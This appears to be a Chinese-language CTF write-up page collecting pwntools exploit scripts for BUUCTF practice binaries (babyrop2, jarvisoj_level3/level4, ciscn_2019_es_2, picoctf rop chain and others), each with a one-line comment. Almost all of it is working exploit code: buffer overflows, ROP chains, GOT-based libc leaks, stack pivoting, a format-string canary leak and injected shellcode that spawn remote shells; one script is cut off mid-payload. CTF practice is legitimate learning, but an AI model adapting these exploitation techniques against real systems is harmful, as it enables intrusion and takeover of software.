
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'info'

r = remote("node4.buuoj.cn", 29727)
# r = process("./babyrop2")
elf = ELF("./babyrop2")

printf_plt = elf.plt['printf']
read_got = elf.got['read']
start = elf.sym['_start']
pop_rdi = 0x400733

# pause()
payload = flat([ 'a'*0x28, pop_rdi, read_got, printf_plt, start ], word_size=64)
r.sendlineafter("What's your name? ", payload)
r.recvline()

# print(r.recvuntil("What")[":-4"].ljust(8, '\x00'))
read_addr = u64(r.recvuntil("What")[:-4].ljust(8, '\x00'))
log.success("read addr => {}".format(hex(read_addr)))

# libc = LibcSearcher("read", read_addr)
# base = read_addr - libc.dump("read")
# system = base + libc.dump("system")
# binsh = base + libc.dump("str_bin_sh")

system = read_addr  -0xb1ec0    # https://libc.nullbyte.cat/?q=read%3A0x7f868a45c250&l=libc6_2.23-0ubuntu10_amd64
binsh = read_addr  +0x95b07

payload1 = flat([ 'a'*0x28, pop_rdi, binsh, system, start ], word_size=64)
r.sendlineafter("name? ", payload1)
r.recvline()

r.interactive()
```

### `jarvisoj_level3`

很烦，`LibcSearcher`一直找不到，我是不是应该在本地部署一个网站查询方式的了...

无语

```python
from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

r = remote("node4.buuoj.cn", 27911)

# r = process("./level3")

elf = ELF("./level3")

write_plt = elf.plt['write']

write_got = elf.got['write']

start = elf.sym['_start']

payload = flat([ 'a'*(0x88+4), write_plt, start, 1, write_got, 4 ])

r.sendlineafter("Input:\n", payload)

# r.recvuntil("Hello, World!\n")

write_addr = u32(r.recv(4))

log.success("write addr => {}".format(hex(write_addr)))

# libc = LibcSearcher('write', write_addr)

# base = write_addr - libc.dump('write')

# system = base + libc.dump("system")

# binsh = base + libc.dump("str_bin_sh")

system = write_addr -0x99a80

binsh = write_addr +0x84c6b

payload1 = flat([ 'a'*(0x88+4), system, start, binsh ])

r.sendlineafter("Input:\n", payload1)

r.interactive()
```

### `ciscn_2019_es_2`

只能覆盖到`ret`，栈迁移，多调试几次就出来了

```python
from pwn import *
context.log_level = 'debug'

r = remote("node4.buuoj.cn", 26024)
# r = process("./ciscn_2019_es_2")  
elf = ELF("./ciscn_2019_es_2")

backdoor = 0x0804854B
system = elf.plt['system']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start = elf.sym['vul']

payload = flat([ 'a'*(0x28) ])
r.sendafter("Welcome, my friend. What's your name?\n", payload)
r.recv(0x2f)
rbp = u32(r.recv(4))
buf = rbp - 0x38
log.success("rbp => {}".format(hex(rbp)))
log.success("buf addr => {}".format(hex(buf)))

pause()
payload1 = flat([ 'a'*4, system, 'a'*4, buf+0x10, "cat
```

### `ez_pz_hackover_2016`

这题也没啥好说的，提示信息那么明显，直接正面刚就行

```python
from pwn import *

context.log_level = 'debug'

r = remote("node4.buuoj.cn", 28861)

# r = process("./ez_pz_hackover_2016")

r.recvuntil("Yippie, lets crash: ")

addr = int(r.recvline()[:-1], 16)

payload = flat([ "crashme", 0, 'a'*15, addr-0x1c, asm(shellcraft.sh()) ])

r.sendlineafter("> ", payload)

r.interactive()
```

### `jarvisoj_tell_me_something`

??? 第一页的最后一道题，还以为会是个堆...

```python
from pwn import *
context.log_level = 'debug'

r = remote("node4.buuoj.cn", 25007)
# r = process("./guestbook")

backdoor = 0x400620

payload = flat([ 'a'*0x88, backdoor ], word_size=64)
r.sendlineafter("Input your message:\n", payload)

r.interactive()
```

### `Black Watch` 入群题-PWN

有意思的一道题，还是溢出只能到`ret`位置，需要栈迁移，`bss`段有一段非常大的空间，来回绕就行了

```python
from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

r = remote("node4.buuoj.cn", 25798)

# r = process("./spwn")

elf = ELF("./spwn")

write_plt = elf.plt['write']

write_got = elf.got['write']

read_plt = elf.plt['read']

start = elf.sym['_start']

pop_ebp = 0x080485ab

pop4_ret = 0x080485A8

bss1 = 0x0804A300

bss2 = 0x0804A500

level = 0x08048511

pause()

payload = flat([ 'a'*4, read_plt, pop4_ret, 0, bss2, 0x200, bss2, level ])

r.sendafter("What is your name?", payload)

payload1 = flat([ 'a'*0x18, bss1, level ])

r.sendafter("What do you want to say?", payload1)

payload2 = flat([ 'a'*4, write_plt, pop4_ret, 1, write_got, 4, bss1, read_plt, level, 0, bss1, 0x200])

r.send(payload2)

write_addr = u32(r.recv(4))

payload3 = flat([ 'a'*4, read_plt, pop4_ret, 0, bss2, 0x200, bss2, level])

r.send(payload3)

log.success("write addr => {}".format(hex(write_addr)))

system = write_addr     -0x99a80

binsh = write_addr + 0x84c6b

payload4 = flat([ 'a'*4, system, 0, binsh ])

r.send(payload4)

r.interactive()
```

### `picoctf_2018_rop chain`

有意思的一道题，考点就是函数构造

```python
from pwn import *

# r = process("./PicoCTF_2018_rop_chain")
r = remote("node4.buuoj.cn", 29404)

win1 = 0x080485CB
win2 = 0x080485D8
flag = 0x0804862B

payload = flat([ 'a'*(0x18+4), win1, win2, flag, 0xBAAAAAAD, 0xDEADBAAD ])
r.sendlineafter("Enter your input>", payload)

r.interactive()
```

### `jarvisoj_level4`

简单题，直接做吧

```python
from pwn import *

context.log_level = 'debug'

r = remote("node4.buuoj.cn", 26172)

# r = process("./level4")

elf = ELF("./level4")

read_plt = elf.plt['read']

read_got = elf.got['read']

write_plt = elf.plt['write']

start = elf.sym['_start']

payload = flat([ 'a'*0x8c, write_plt, start, 1, read_got, 4 ])

r.sendline(payload)

read_addr = u32(r.recv(4))

log.success("read addr => {}".format(hex(read_addr)))

from SearchLibc import *

libc = SearchLibc("read", read_addr)

system, binsh, read_libc = libc.dump([ 'system', 'str_bin_sh', 'read' ])

system += read_addr - read_libc

binsh += read_addr - read_libc

payload = flat([ 'a'*0x8c, system, start, binsh ])

r.sendline(payload)

r.interactive()
```

### `jarvisoj_level3_x64`

和上一道题没什么大区别

```python
from pwn import *
context.log_level = 'debug'

r = remote("node4.buuoj.cn", 29192)
# r = process("./level3_x64")
elf = ELF("./level3_x64")

pop_rdi = 0x00000000004006b3 
pop_rsi_r15 = 0x00000000004006b1

write_plt = elf.plt['write']
write_got = elf.got['write']
start = elf.sym['_start']

payload = flat([ 'a'*136, pop_rsi_r15, write_got, 0, pop_rdi, 1, write_plt, start ], word_size=64)
r.recvuntil("Input:")
# pause()
r.sendline(payload)
r.recvline()
write_addr = u64(r.recv(8))
log.success("write addr => {}".format(hex(write_addr)))

from SearchLibc import *
libc = SearchLibc("write", write_addr)
system, binsh, write_libc = libc.dump([ 'system', 'str_bin_sh', 'write' ])
system += write_addr - write_libc
binsh += write_addr - write_libc

payload = flat([ 'a'*136, pop_rdi, binsh, system ], word_size=64)
r.sendlineafter("Input:", payload)

r.interactive()
```

### `bjdctf_2020_babyrop2`

正常难度

```python
from pwn import *

context.log_level='debug'

r = remote("node4.buuoj.cn", 28029)

# r = process("./bjdctf_2020_babyrop2")

elf = ELF("./bjdctf_2020_babyrop2")

start = elf.sym['vuln']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

pop_rdi = 0x0000000000400993

pop_rsi_r15 = 0x0000000000400991

r.sendlineafter("I'll give u some gift to help u!\n", '%7$p')

canary = int(r.recvline()[2:-1], 16)

log.success("canary => {}".format(hex(canary)))

payload = flat([ 'a'*0x18, canary, canary, pop_rdi, puts_got, puts_plt, start ], word_size=64)

r.sendlineafter("Pull up your sword and tell me u story!\n", payload)

puts_addr = u64(r.recvline()[:-1].ljust(8, '\x00'))

log.success("puts => {}".format(hex(puts_addr)))

from SearchLibc import *

libc = SearchLibc("puts", puts_addr)

system, binsh, puts_libc = libc.dump([ 'system', 'str_bin_sh', 'puts' ])

system += puts_addr - puts_libc

binsh += puts_addr - puts_libc

payload = flat([ 'a'*0x18, canary, canary, pop_rdi, binsh, system ], word_size=64)

r.sendlineafter("Pull up your sword and tell me u story!\n", payload)

r.interactive()
```
